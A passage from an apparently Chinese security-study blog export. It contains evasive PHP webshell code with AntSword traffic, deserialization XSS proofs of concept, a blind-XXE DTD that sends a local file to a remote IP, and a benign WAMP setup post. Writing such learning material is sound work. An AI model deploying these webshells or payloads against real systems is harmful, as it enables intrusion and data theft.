   <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">SimpleThis::NonStatic($_key, $_value);</span><br></pre></td></tr></table></figure>
<p>在C、Java中，非静态函数肯定是不能被静态调用的。首先会编译失败。但是PHP是个解释函数。至于原理：这里直接附上鸟哥的<a href="https://www.laruence.com/2012/06/14/2628.html" target="_blank" rel="noopener">文章</a></p>
<h1 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h1><p>将蚁剑挂上burpsuite。上传我们的一句话木马进行连接。</p>
<ul>
<li>请求的流量<br><img src="request.png" alt="请求"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert=@eval(@str_rot13($_POST[ca3a283bf3d534]));&amp;ca3a283bf3d534=@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg)&#123;erghea $bhg;&#125;;shapgvba nfbhgchg()&#123;$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;ron28298&quot;;rpub @nfrap($bhgchg);rpub &quot;9741440r5&quot;;&#125;bo_fgneg();gel&#123;$Q=qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q==&quot;&quot;)$Q=qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E=&quot;&#123;$Q&#125;	&quot;;vs(fhofge($Q,0,1)!=&quot;/&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.=&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.=&quot;/&quot;;&#125;$E.=&quot;	&quot;;$h=(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f=($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.=&quot;	&#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE://&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr();</span><br></pre></td></tr></table></figure></li>
<li>可以得到webshell执行的内容为：<code>assert(@eval(@str_rot13($_POST[ca3a283bf3d534]));)</code>，接着<code>&amp;ca3a283bf3d534=xxxx</code>为我们的第二个POST参数<br>所以实际上webshell执行的是第二个随机参数的值。</li>
<li>回显<br><img src="response.png" alt="回显"><br><code>Call to undefined function ca3a283bf3d534()</code>这里报错未定义的函数，很显然我们的可变函数的函数名被覆盖了。并没有执行<code>assert()</code>，达到预期的结果。<br>实际上我们需要的是第一个POST参数即我们传入的assert。所以我们的webshell在循环数组时，造成了变量覆盖，后来的参数覆盖了前一个值。在webshell中我们需要取第一个值再传递它即可。</li>
</ul>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>以第一个webshell为例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s0;</span><br><span class="line">$s1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para, $_value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $para($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line">print_r($class1);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;<span class="number">1</span>;$i++) &#123;</span><br><span class="line">            $&#123;<span class="string">"s"</span>.$i&#125; = $_key;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = $class1-&gt;newInstance($s0, $_value);</span><br></pre></td></tr></table></figure>
<p>我们依然使用可变变量的方式获取参数的值。我们循环一次将函数名取出，再传递即可。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p><img src="last.png" alt="last"></p>
]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2019/10/28/test/</url>
    <content><![CDATA[<h1 id="It-is-a-Test-Page"><a href="#It-is-a-Test-Page" class="headerlink" title="It is a Test Page"></a>It is a Test Page</h1><p>Hello World<br>最后编辑于2020.5.14</p>
<a id="more"></a>
<p>:)</p>
]]></content>
  </entry>
  <entry>
    <title>PHP反序列化和XXE的学习</title>
    <url>/2020/06/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CXXE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习的时候看了一个师傅的博客，里面提到的知识点可以扩大我们的攻击面，这里记录一下自己对这些知识点的理解和运用</p>
<a id="more"></a>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>这和我们平时遇到的反序列化利用不同，在不能使用phar协议进行反序列化的时候，通常我们挖掘反序列化POP链时的需要的条件：</p>
<ol>
<li>存在可控的反序列化参数</li>
<li>程序中存在可用的类并且存在<code>wakeup()</code>或<code>destruct()</code>魔法函数</li>
<li>该类在魔法函数中能否在当前调用中触发</li>
</ol>
<ul>
<li>如果当前程序中不存在我们可用的类，那我们的POP链就断了。<h2 id="PHP可用的反序列化原生类"><a href="#PHP可用的反序列化原生类" class="headerlink" title="PHP可用的反序列化原生类"></a>PHP可用的反序列化原生类</h2></li>
</ul>
<ol>
<li>Error<br>Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，原因是该类存在一个<code>__toString</code>方法，我们来复习一下<code>__toString</code>方法。<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><code>__toString()</code>：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条<code>E_RECOVERABLE_ERROR</code>级别的致命错误。<blockquote>
<p>当一个对象被当作一个字符串使用时候会触发。</p>
</blockquote>
</li>
</ol>
<ul>
<li>由于php的语言特性，php一些函数会自动完成类型转换，下面是<code>__toString()</code>方法的触发条件</li>
</ul>
<ol>
<li>echo ($obj) / print($obj) 打印时会触发</li>
<li>反序列化对象与字符串连接时</li>
<li>反序列化对象参与格式化字符串时</li>
<li>反序列化对象与字符串进行<code>==</code>比较时（<strong>PHP进行==比较的时候会转换参数类型</strong>）</li>
<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
<li>反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</li>
<li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</li>
<li>反序列化的对象作为 class_exists() 的参数的时候<br>所以结果很显然了，我们写一个demo来测试一下是否能触发XSS，就拿我上篇laravel反序列化的demo来测试一下<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Test</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="comment">//test unserialize</span></span><br><span class="line">        $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        unserialize($code);</span><br><span class="line">        <span class="keyword">echo</span> $code;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>POC<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
可以看到成功弹窗<br><img src="xss1.png" alt="xss1"></li>
</ul>
<ol start="2">
<li>Exception<br>这个类利用的方式和原理和<code>Error</code>类一样，不同是它适用于PHP5和PHP7，所以更好用</li>
</ol>
<ul>
<li>POC<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
弹窗成功<br><img src="xss2.png" alt="xss2"></li>
</ul>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>下面的代码来源于<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>]; <span class="comment">//HomeController</span></span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个代码存在两种漏洞，第一种是任意文件读取，第二个就是盲打XXE。</p>
<ol>
<li>任意文件读取<br>这个漏洞的触发点在<code>class_exists</code>，我们来看php手册如何解释这个函数<br><img src="class_exists.png" alt="class_exists"><br>可以看到该函数存在2个参数，第一个是要检查的类，第二个参数<code>autoload</code>决定是否默认调用 __autoload。可以看到默认是<code>True</code><blockquote>
<p>这个漏洞只能在php5.3之下利用</p>
</blockquote>
</li>
</ol>
<ul>
<li>变量<code>$controllerName</code>可控，进入if判断我们传入的类是否存在，不存在则调用<code>__autoload</code>尝试加载，如果我们传入<code>../../../../etc/passwd</code>，就造成了任意文件读取<br><img src="%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.png" alt="任意文件读取"><br>由于我这里没有这么低版本的环境，就没有测试下去了（大于php5.3版本传入类名包含<code>.</code>和<code>/</code>就会自动跳出）</li>
</ul>
<ol start="2">
<li>XXE<br>这里我们利用到了PHP的一个原生类SimpleXMLElement</li>
</ol>
<ul>
<li>首先看源代码，漏洞触发点是在<code>$controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</code>实例化对象这里，这里用到了可变变量，所以我们new一个任意的对象。</li>
<li>接下来看原生类SimpleXMLElement的构造方法<br><img src="SimpleXMLElement__construct.png" alt="SimpleXMLElement::__construct"><br>参数：</li>
<li>data：格式正确的XML字符串，当参数<code>data_is_url</code>是<code>True</code>时，传入一个URL字符串</li>
<li>options：（可选）用于指定其他Libxml参数。</li>
</ul>
<p>思路就是传入一个<code>SimpleXMLElement</code>类进行实例化，当XML外部实体可控，就造成XXE，源码没有echo等函数回显，所以我们利用盲打XXE</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
<li>首先我们在在本地上传一个<code>test2.dtd</code>文件<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///C:/Windows/system.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://10.3.131.118:1111?p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
这里我们用到了参数实体，顺便写一下两种实体的区别</li>
</ul>
<ol>
<li>通用实体<br>用 <code>&amp;实体名;</code>，引用的实体（例如上面的<code>&amp;xxe;</code>），他在DTD 中定义，在 XML 文档中引用<blockquote>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>参数实体：<ol>
<li>使用 % 实体名(这里面空格不能少) 在 DTD 中<strong>定义</strong>，并且只能在 DTD 中使用<code>%实体名;</code> <strong>引用</strong></li>
<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
<li>和通用实体一样，参数实体也可以外部引用<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote-dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">localhost</span>/<span class="attr">test.dtd</span>"&gt;</span> </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>参数实体在我们 Blind XXE 中起到了至关重要的作用</strong></p>
</blockquote>
</li>
</ol>
</li>
</ol>
<ul>
<li>接下来我们来构造POC<br>参数c是我们要实例化的类：<code>c=SimpleXMLElement</code><br>构造函数存在2个参数，第一个当然是data，第二个是options；options这里我们选择<code>LIBXML_NOENT</code>，预设值为2<br><img src="LIBXML_NOENT.png" alt="LIBXML_NOENT"><br>XML的内容：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://10.3.131.118/test2.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br></pre></td></tr></table></figure>
接下来在本地用NC开启监听，不出意外我们会收到请求<br><img src="result.png" alt="result"><br>也可以将dtd中的端口改为Web端口，然后再apache查看日志即可<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1>其实还有一部分知识点没有写完，先在这里留个坑好了，过几天补充剩下的。</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次在wamper64中增加php遇到的问题</title>
    <url>/2020/01/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9C%A8wamper64%E4%B8%AD%E5%A2%9E%E5%8A%A0php%E7%89%88%E6%9C%AC%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<p>在wamper64中手动增加php版本碰到了不少问题，记录总结一下</p>
<a id="more"></a>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>因为要复现joomla3.4.6的一个RCE，php要求在5.6.13下才行，我的wamper自带的php5只有5.6.40，所以需要我手动安装一个低版本</p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>一开始我找我的小伙伴要了他的phpstudy下的php5.3.29，按照网上的方法配置好后wamper是橘色的，一看果然有个服务没启动，于是我查看后发现是apache没有正常启动，<br>查看了一下错误日志后发现是php目录下的wampserver.conf文件内容出了问题<br>最后定位到第9行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phpConf[<span class="string">'phpIniDir'</span>] = <span class="string">'.'</span>;</span><br><span class="line">$phpConf[<span class="string">'phpExeDir'</span>] = <span class="string">'.'</span>;</span><br><span class="line">$phpConf[<span class="string">'phpConfFile'</span>] = <span class="string">'php.ini'</span>;</span><br><span class="line"><span class="comment">//PHP 5.6.x needs Apache 2.4.x and doesn't works with Apache 2.2.x</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['LoadModuleName'] = 'php5_module';</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['LoadModuleFile'] = 'php5apache2_2.dll';</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['AddModule'] =  '';</span></span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'LoadModuleName'</span>] = <span class="string">'php5_module'</span>;</span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'LoadModuleFile'</span>] = <span class="string">'php5apache2_4.dll'</span>;</span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'AddModule'</span>] =  <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>显然是php5apache2_2.dll这个dll加载失败了。我想起小伙伴传给我的php文件里是没有这个dll的，这个dll是我从自己的php5.6.40拷贝过来的，我仔细看了一下他传给我的文件叫：<code>php5.3.29nts.rar</code>，我去查了一下nts的含义，果然是php版本的问题，官方的解释是这样的：<br>NTS全称：<code>Non Thread Safe</code>，TS是指具有多线程功能的构建。NTS仅指单线程构建。TS二进制文件的用例涉及与多线程SAPI和作为模块加载到Web服务器的PHP的交互。对于NTS二进制文件，广泛的用例是通过FastCGI协议与Web服务器进行交互，而不使用多线程（例如CLI）。</li>
<li>如果你要使用apache，则需要使用TS版本；如果是IIS，则使用NTS等等<br>所以我又去下了一个5.3.29TS版本，下载好安装完成，却发现目录下没有<code>php5apache2_4.dll</code>而是<code>php5apache2_2.dll</code>，后来我看到wampserver.conf下第7行：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//PHP 5.6.x needs Apache 2.4.x and doesn&apos;t works with Apache 2.2.x</span><br></pre></td></tr></table></figure>
而且我的wamper中只有一个apache2.4版本的，所以需要重新下个版本稍高点的</li>
</ul>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>总结一下需要更改的配置文件</p>
<ol>
<li>将你的任意版本php下的php.ini复制到新php目录下，并替换其中的版本号</li>
<li>(本例中)将php5版本下的wampserver.conf复制到新php目录下，具体改的地方要看实际情况</li>
<li>将你的任意版本php下的phpForApache.ini复制到新php目录下，替换其中的版本号</li>
<li>打开wamper的配置文件<code>{wamper安装路径}/wampmanager.ini</code>，全局搜索<code>[phpversion]</code></li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[phpVersion]</span></span><br><span class="line"><span class="comment">;WAMPPHPVERSIONSTART</span></span><br><span class="line">Type: item; Caption: "5.6.11"; Action: multi; Actions:switchPhp5.6.11; Glyph: 13</span><br><span class="line">Type: item; Caption: "5.6.40"; Action: multi; Actions:switchPhp5.6.40</span><br><span class="line">Type: item; Caption: "7.0.33"; Action: multi; Actions:switchPhp7.0.33</span><br><span class="line">Type: item; Caption: "7.1.29"; Action: multi; Actions:switchPhp7.1.29</span><br><span class="line">Type: item; Caption: "7.2.18"; Action: multi; Actions:switchPhp7.2.18</span><br><span class="line">Type: item; Caption: "7.3.5"; Action: multi; Actions:switchPhp7.3.5</span><br><span class="line"><span class="section">[switchPhp5.6.11]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 5.6.11";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br><span class="line"><span class="section">[switchPhp5.6.40]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 5.6.40";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br><span class="line"><span class="section">[switchPhp7.0.33]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 7.0.33";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在<code>;WAMPPHPVERSIONSTART</code>下方插入:<code>Type: item; Caption: &quot;{你的版本号}}&quot;; Action: multi; Actions:switchPhp{你的版本号}</code></p>
</li>
<li><p>接下来在<code>[switchPhpx.x.xx]</code>前插入</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[switchPhp&#123;你的版本号&#125;]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;安装路径&#125;/php/php&#123;你的版本号&#125;/php-win.exe";Parameters: "switchPhpVersion.php &#123;你的版本号&#125;";WorkingDir: "&#123;安装路径&#125;scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;安装路径&#125;/bin/php/php&#123;你的版本号&#125;/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "&#123;安装路径&#125;/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;安装路径&#125;/bin/php/php&#123;你的版本号&#125;/php-win.exe";Parameters: "refresh.php";WorkingDir: "&#123;安装路径&#125;/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br></pre></td></tr></table></figure>

<ul>
<li>更改完成后退出wamper64，然后重启各项服务就🆗了</li>
</ul>
]]></content>
      <categories>
        <category>apache</category>
      </categories>
      <tags>
        <tag>wamper64</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel5.7反序列化RCE漏洞分析</title>
    <url>/2020/03/06/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前只是粗略的知道反序列化漏洞的原理，最近在学习Laravel框架的时候正好想起以前收藏的一篇反序列化RCE漏洞，借此机会跟着学习一下POP链的挖掘</p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Laravel是一个使用广泛并且优秀的PHP框架。这次挖掘的漏洞Laravel5.7版本，该漏洞需要对框架进行二次开发才能触发该漏洞</p>
<h1 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h1><ul>
<li>Laravel5.7.28</li>
<li>Wamper64+PHP7.3.5（PHP &gt;= 7.1.3）<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2></li>
</ul>
<ol>
<li>使用composer部署Laravel项目<ul>
<li>创建一个名为laravel的Laravel项目<br><code>composer create-project laravel/laravel=5.7.* --prefer-dist ./</code></li>
<li>Laravel框架为单入口，入口文件为<code>{安装目录}/public/index.php</code>，使用apache部署后访问入口文件显示<em>Laravel欢迎界面</em>即安装成功（或者使用命令<code>php artisan serve</code>开启临时的开发环境的服务器进行访问）</li>
</ul>
</li>
<li>配置路由以及控制器<ul>
<li>Laravel所有的用户请求都由路由来进行控制。我们添加一条如下的路由<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> \<span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the "web" middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 添加的路由</span></span><br><span class="line">Route::get(<span class="string">'/test'</span>, <span 